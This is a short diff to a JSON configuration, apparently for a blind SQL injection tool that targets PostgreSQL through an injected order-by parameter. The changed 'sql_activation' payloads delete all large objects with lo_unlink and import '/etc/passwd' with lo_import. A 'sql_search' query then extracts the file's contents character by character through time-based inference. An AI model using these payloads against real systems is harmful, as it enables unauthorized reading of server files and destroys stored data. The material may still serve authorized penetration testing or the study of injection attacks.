@@ -6,7 +6,10 @@
         "injected_param_name": "order_by_param_name",
         "injected_param_valid_value": "good_value",
         "time_threshold": 0.5,
-        "sql_activation": "SELECT lo_import('/etc/passwd')",
+        "sql_activation": [
+                "select lo_unlink(loid) from pg_largeobject",
+                "SELECT lo_import('/etc/passwd')"
+        ],
         "sql_search": "SELECT data from (select substr(encode(data,'escape'),:IDX:,1) as data from pg_largeobject ) as obj where data like :CHR: ESCAPE '\\' limit 1",
         "single_value": true,
         "encode_value": true
